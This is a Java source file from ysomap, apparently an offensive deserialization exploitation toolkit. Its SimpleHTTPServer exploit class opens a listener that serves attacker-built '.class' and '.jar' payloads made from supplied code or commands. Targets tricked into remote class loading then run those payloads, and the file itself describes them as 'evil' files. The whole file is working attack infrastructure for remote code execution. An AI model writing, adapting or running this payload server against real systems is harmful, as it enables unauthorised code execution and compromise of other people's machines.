package ysomap.core.exploit.http;

import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import ysomap.annotation.*;
import ysomap.core.bean.Exploit;
import ysomap.util.HTTPHelper;
import ysomap.util.Logger;

import java.util.LinkedHashMap;
import java.util.Map;


/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"none"})
@Dependencies({"mounted a evil file, like evil.class/evil.jar"})
public class SimpleHTTPServer extends Exploit {

//    @NotNull
//    @Require(name = "lhost", detail = "current host to listen")
//    private String lhost = null;
    @NotNull
    @Require(name = "lport", type = "int", detail = "port to listen")
    private String lport = null;
    @NotNull
    @Require(name = "objectName", detail = "remote object name")
    private String objectName = null;
    @NotNull
    @Require(name = "body", detail = "code[start with 'code:'] or command to generate")
    private String body = null;

    private HttpServer server;

    @Override
    public void work() {
        int p = Integer.parseInt(lport);
        String clzName = objectName+".class";
        String jarName = objectName+".jar";
//        String codebase = "http://"+lhost+":"+lport+"/";
        try {// 同时创建mlets.xml,class和jar文件的挂载
            Map<String, HttpHandler> paths = new LinkedHashMap<>();
            paths.put("/"+clzName, HTTPHelper.makeHTTPHandler(objectName+".class", body));
            paths.put("/"+jarName, HTTPHelper.makeHTTPHandler(objectName+".jar", body));
            server = HTTPHelper.makeSimpleHTTPServer(p, paths);
            Logger.success("Opening Payload HTTPServer on " + lport);
            Logger.success("Paths /"+objectName+"[.class|.jar]");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        if(server != null){
            server.stop(0);
            Logger.success("SimpleHTTPServer stopped");
        }
        exit = true;
    }

    @Override
    public String toString() {
        return "SimpleHTTPServer{" +
                "lport='" + lport + '\'' +
                ", objectName='" + objectName + '\'' +
                ", body='" + body + '\'' +
                '}';
    }
}
